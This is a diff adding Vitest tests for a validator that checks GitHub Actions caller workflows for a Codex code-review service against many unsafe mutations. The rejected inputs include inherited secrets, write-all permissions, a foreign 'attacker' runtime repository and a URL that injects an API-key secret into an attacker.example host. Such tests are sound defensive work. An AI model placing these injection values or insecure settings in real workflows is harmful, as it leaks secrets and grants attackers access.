@@ -1,3 +1,4 @@
+import { createHash } from "node:crypto";
 import { describe, expect, it } from "vitest";
 import {
   allocateVersionedProviderSecretNamespace,
@@ -10,6 +11,10 @@ import {
   isTrustedDefaultBranchTriggeredCodexWorkflowSchemaVersion,
   isVersionedSecretNamespaceCodexWorkflowSchemaVersion,
   readCanonicalCodexRotatingT0WorkflowSourceMetadata,
+  readCodexRotatingWorkflowSourceMetadata,
+  renderCanonicalAccountGatewayWorkflow,
+  workflowDocumentSemanticSha256,
+  areWorkflowDocumentsSemanticallyEqual,
   readCanonicalIsolatedQualityWorkflowSourceMetadata,
   renderCodexRotatingAdvisoryWorkflow,
   renderCanonicalCodexRotatingT0WorkflowV4,
@@ -427,3 +432,425 @@ it("rejects schema 6 source even when every other byte is canonical V5", () => {
     ),
   ).toThrow("codex_rotating_t0_workflow_metadata_missing");
 });
+
+// Independently accepted public 26-line caller, frozen SHA256 c11fae9d89b8c858e7c1df539704080ee6a1673d8941a8765085fdfb439bddcf.
+// Embedded so product regression tests do not depend on orchestration inputs.
+const acceptedAccountGatewayCaller = `name: ReviewRouter Codex
+on:
+  pull_request:
+    types: [opened, synchronize, reopened, ready_for_review, converted_to_draft]
+permissions: {}
+jobs:
+  codex-review:
+    if: \${{ github.event.pull_request.head.repo.full_name == github.repository && github.event.pull_request.user.type != 'Bot' && github.event.pull_request.draft == false }}
+    concurrency:
+      group: reviewrouter-codex-\${{ github.repository_id }}
+      cancel-in-progress: false
+    permissions:
+      contents: read
+      pull-requests: read
+      id-token: write
+    uses: 777genius/review-router/.github/workflows/reviewrouter-t0-reusable.yml@9d30879b333c6474d104f5911f548419702b758b
+    with:
+      runtime_ref: "9d30879b333c6474d104f5911f548419702b758b"
+      api_url: "https://aberdeen-say-beverages-testimony.trycloudflare.com"
+      pr_number: \${{ format('{0}', github.event.pull_request.number) }}
+      review_head_sha: \${{ github.event.pull_request.head.sha }}
+      provider_instance_id: "codex-rotating:1317214237"
+      runtime_config_mode: oidc
+      codex_session_mode: account-gateway
+      workflow_schema_version: 2
+      review_timeout_minutes: 60
+`;
+
+describe("canonical account-gateway public caller", () => {
+  it("roundtrips the accepted public caller through the strict metadata reader", () => {
+    expect(
+      createHash("sha256").update(acceptedAccountGatewayCaller).digest("hex"),
+    ).toBe("c11fae9d89b8c858e7c1df539704080ee6a1673d8941a8765085fdfb439bddcf");
+    expect(
+      readCanonicalCodexRotatingT0WorkflowSourceMetadata(
+        acceptedAccountGatewayCaller,
+      ),
+    ).toMatchObject({
+      actionRef:
+        "777genius/review-router@9d30879b333c6474d104f5911f548419702b758b",
+      apiUrl: "https://aberdeen-say-beverages-testimony.trycloudflare.com",
+      providerInstanceId: "codex-rotating:1317214237",
+      workflowSchemaVersion: 2,
+      codexSessionMode: "account-gateway",
+      runtimeConfigMode: "oidc",
+      runtimeRef: "9d30879b333c6474d104f5911f548419702b758b",
+    });
+    const metadata = readCanonicalCodexRotatingT0WorkflowSourceMetadata(
+      acceptedAccountGatewayCaller,
+    );
+    expect(metadata).not.toHaveProperty("secretNamespace");
+    expect(
+      readCodexRotatingWorkflowSourceMetadata(acceptedAccountGatewayCaller),
+    ).toEqual(metadata);
+    expect(
+      renderCanonicalAccountGatewayWorkflow({
+        actionRef: metadata.actionRef,
+        apiUrl: metadata.apiUrl,
+        githubRepositoryId: "1317214237",
+      }),
+    ).toBe(acceptedAccountGatewayCaller);
+  });
+
+  it("accepts the accepted public caller through the advisory inventory scanner", () => {
+    expect(
+      scanCodexRotatingAdvisoryWorkflow(acceptedAccountGatewayCaller),
+    ).toEqual({ valid: true, errors: [] });
+  });
+});
+
+const acceptedCallerSha = "9d30879b333c6474d104f5911f548419702b758b";
+const otherCallerSha = "a".repeat(40);
+
+// Mutations of the independently accepted caller exercise the real inventory boundaries.
+it.each([
+  ["inherited secrets", (source: string) => source + "    secrets: inherit\n"],
+  ["empty secrets mapping", (source: string) => source + "    secrets: {}\n"],
+  ["null secrets", (source: string) => source + "    secrets:\n"],
+  [
+    "literal auth secret",
+    (source: string) =>
+      source +
+      "    secrets:\n      CODEX_AUTH_JSON: ${{ secrets.REVIEWROUTER_CODEX_AUTH_JSON }}\n",
+  ],
+  [
+    "quoted secrets mapping",
+    (source: string) => source + '    "secrets": {}\n',
+  ],
+  [
+    "refresh job",
+    (source: string) =>
+      source + "  codex-refresh:\n    runs-on: ubuntu-latest\n",
+  ],
+  [
+    "sibling writer",
+    (source: string) =>
+      source +
+      "  writer:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n",
+  ],
+  [
+    "missing mode",
+    (source: string) =>
+      source.replace("      codex_session_mode: account-gateway\n", ""),
+  ],
+  [
+    "unknown mode",
+    (source: string) =>
+      source.replace(
+        "codex_session_mode: account-gateway",
+        "codex_session_mode: unknown",
+      ),
+  ],
+  [
+    "null mode",
+    (source: string) =>
+      source.replace(
+        "codex_session_mode: account-gateway",
+        "codex_session_mode: null",
+      ),
+  ],
+  [
+    "legacy mode",
+    (source: string) =>
+      source.replace(
+        "codex_session_mode: account-gateway",
+        "codex_session_mode: rotating",
+      ),
+  ],
+  [
+    "unsupported schema",
+    (source: string) =>
+      source.replace(
+        "workflow_schema_version: 2",
+        "workflow_schema_version: 6",
+      ),
+  ],
+  [
+    "other supported schema",
+    (source: string) =>
+      source.replace(
+        "workflow_schema_version: 2",
+        "workflow_schema_version: 3",
+      ),
+  ],
+  [
+    "string schema",
+    (source: string) =>
+      source.replace(
+        "workflow_schema_version: 2",
+        'workflow_schema_version: "2"',
+      ),
+  ],
+  [
+    "missing schema",
+    (source: string) =>
+      source.replace("      workflow_schema_version: 2\n", ""),
+  ],
+  [
+    "unequal runtime pin",
+    (source: string) =>
+      source.replace(
+        `runtime_ref: "${acceptedCallerSha}"`,
+        `runtime_ref: "${otherCallerSha}"`,
+      ),
+  ],
+  [
+    "unequal action pin",
+    (source: string) =>
+      source.replace(`.yml@${acceptedCallerSha}`, `.yml@${otherCallerSha}`),
+  ],
+  [
+    "mutable action",
+    (source: string) => source.replace(`.yml@${acceptedCallerSha}`, ".yml@v1"),
+  ],
+  [
+    "mutable runtime",
+    (source: string) =>
+      source.replace(
+        `runtime_ref: "${acceptedCallerSha}"`,
+        'runtime_ref: "v1"',
+      ),
+  ],
+  [
+    "foreign runtime repository",
+    (source: string) =>
+      source.replace(
+        "uses: 777genius/review-router/",
+        "uses: attacker/runtime/",
+      ),
+  ],
+  [
+    "static configuration",
+    (source: string) =>
+      source.replace(
+        "runtime_config_mode: oidc",
+        "runtime_config_mode: static",
+      ),
+  ],
+  [
+    "dispatch ingress",
+    (source: string) =>
+      source.replace("  pull_request:", "  workflow_dispatch:"),
+  ],
+  [
+    "target ingress",
+    (source: string) =>
+      source.replace("  pull_request:", "  pull_request_target:"),
+  ],
+  [
+    "missing event",
+    (source: string) => source.replace("opened, synchronize,", "opened,"),
+  ],
+  [
+    "extra ingress",
+    (source: string) => source.replace("on:\n", "on:\n  push:\n"),
+  ],
+  [
+    "top-level permissions",
+    (source: string) =>
+      source.replace("permissions: {}", "permissions: write-all"),
+  ],
+  [
+    "job write permission",
+    (source: string) =>
+      source.replace("pull-requests: read", "pull-requests: write"),
+  ],
+  [
+    "missing OIDC",
+    (source: string) => source.replace("      id-token: write\n", ""),
+  ],
+  [
+    "extra permission",
+    (source: string) =>
+      source.replace(
+        "      id-token: write\n",
+        "      id-token: write\n      actions: write\n",
+      ),
+  ],
+  [
+    "changed concurrency",
+    (source: string) =>
+      source.replace("group: reviewrouter-codex-", "group: another-"),
+  ],
+  [
+    "cancellation",
+    (source: string) =>
+      source.replace("cancel-in-progress: false", "cancel-in-progress: true"),
+  ],
+  [
+    "extra queue",
+    (source: string) =>
+      source.replace(
+        "cancel-in-progress: false",
+        "cancel-in-progress: false\n      queue: max",
+      ),
+  ],
+  [
+    "missing same-repo guard",
+    (source: string) =>
+      source.replace(
+        "github.event.pull_request.head.repo.full_name == github.repository && ",
+        "",
+      ),
+  ],
+  [
+    "missing nonbot guard",
+    (source: string) =>
+      source.replace("github.event.pull_request.user.type != 'Bot' && ", ""),
+  ],
+  [
+    "draft admission",
+    (source: string) =>
+      source.replace(
+        "github.event.pull_request.draft == false",
+        "github.event.pull_request.draft == true",
+      ),
+  ],
+  [
+    "unbound PR",
+    (source: string) =>
+      source.replace(
+        "pr_number: ${{ format('{0}', github.event.pull_request.number) }}",
+        'pr_number: "42"',
+      ),
+  ],
+  [
+    "unbound head",
+    (source: string) =>
+      source.replace(
+        "review_head_sha: ${{ github.event.pull_request.head.sha }}",
+        `review_head_sha: "${otherCallerSha}"`,
+      ),
+  ],
+  [
+    "extra legacy input",
+    (source: string) =>
+      source.replace(
+        "      codex_session_mode:",
+        "      max_changed_lines: 100\n      codex_session_mode:",
+      ),
+  ],
+  [
+    "missing timeout",
+    (source: string) =>
+      source.replace("      review_timeout_minutes: 60\n", ""),
+  ],
+  [
+    "out-of-range timeout",
+    (source: string) =>
+      source.replace(
+        "review_timeout_minutes: 60",
+        "review_timeout_minutes: 361",
+      ),
+  ],
+  [
+    "invalid provider",
+    (source: string) =>
+      source.replace("codex-rotating:1317214237", "codex-rotating:01317214237"),
+  ],
+  [
+    "API expression injection",
+    (source: string) =>
+      source.replace(
+        "https://aberdeen-say-beverages-testimony.trycloudflare.com",
+        "https://${{secrets.OPENAI_API_KEY}}.attacker.example",
+      ),
+  ],
+  [
+    "API path injection",
+    (source: string) =>
+      source.replace(
+        "testimony.trycloudflare.com",
+        "testimony.trycloudflare.com/extra",
+      ),
+  ],
+  ["extra steps", (source: string) => source + "    steps: []\n"],
+  [
+    "duplicate mode",
+    (source: string) => source + "      codex_session_mode: account-gateway\n",
+  ],
+] as const)(
+  "rejects account-gateway %s at both inventory boundaries",
+  (_name, mutate) => {
+    const changed = mutate(acceptedAccountGatewayCaller);
+    expect(changed).not.toBe(acceptedAccountGatewayCaller);
+    expect(() =>
+      readCanonicalCodexRotatingT0WorkflowSourceMetadata(changed),
+    ).toThrow();
+    expect(scanCodexRotatingAdvisoryWorkflow(changed).valid).toBe(false);
+    expect(() => readCodexRotatingWorkflowSourceMetadata(changed)).toThrow();
+  },
+);
+
+it("preserves semantic digest binding while retaining exact caller source bytes", () => {
+  const formatted = acceptedAccountGatewayCaller.replace(
+    "name: ReviewRouter Codex",
+    'name: "ReviewRouter Codex"',
+  );
+  expect(readCanonicalCodexRotatingT0WorkflowSourceMetadata(formatted)).toEqual(
+    readCanonicalCodexRotatingT0WorkflowSourceMetadata(
+      acceptedAccountGatewayCaller,
+    ),
+  );
+  expect(
+    areWorkflowDocumentsSemanticallyEqual(
+      formatted,
+      acceptedAccountGatewayCaller,
+    ),
+  ).toBe(true);
+  expect(workflowDocumentSemanticSha256(formatted)).toBe(
+    workflowDocumentSemanticSha256(acceptedAccountGatewayCaller),
+  );
+  expect(createHash("sha256").update(formatted).digest("hex")).not.toBe(
+    createHash("sha256").update(acceptedAccountGatewayCaller).digest("hex"),
+  );
+  const changed = acceptedAccountGatewayCaller.replace(
+    "cancel-in-progress: false",
+    "cancel-in-progress: true",
+  );
+  expect(workflowDocumentSemanticSha256(changed)).not.toBe(
+    workflowDocumentSemanticSha256(acceptedAccountGatewayCaller),
+  );
+});
+
+it.each([10, 15, 360])(
+  "recognizes bounded gateway timeout %i",
+  (reviewTimeoutMinutes) => {
+    const source = renderCanonicalAccountGatewayWorkflow({
+      actionRef: `777genius/review-router@${"a".repeat(40)}`,
+      apiUrl: "https://api.reviewrouter.site",
+      githubRepositoryId: "123456",
+      reviewTimeoutMinutes,
+    });
+    expect(
+      readCanonicalCodexRotatingT0WorkflowSourceMetadata(source),
+    ).toMatchObject({
+      codexSessionMode: "account-gateway",
+      providerInstanceId: "codex-rotating:123456",
+    });
+    expect(scanCodexRotatingAdvisoryWorkflow(source)).toEqual({
+      valid: true,
+      errors: [],
+    });
+  },
+);
+
+it.each([9, 361, 15.5, Number.NaN])(
+  "rejects invalid gateway timeout %s",
+  (reviewTimeoutMinutes) => {
+    expect(() =>
+      renderCanonicalAccountGatewayWorkflow({
+        actionRef: `777genius/review-router@${"a".repeat(40)}`,
+        apiUrl: "https://api.reviewrouter.site",
+        githubRepositoryId: "123456",
+        reviewTimeoutMinutes,
+      }),
+    ).toThrow("account_gateway_review_timeout_invalid");
+  },
+);
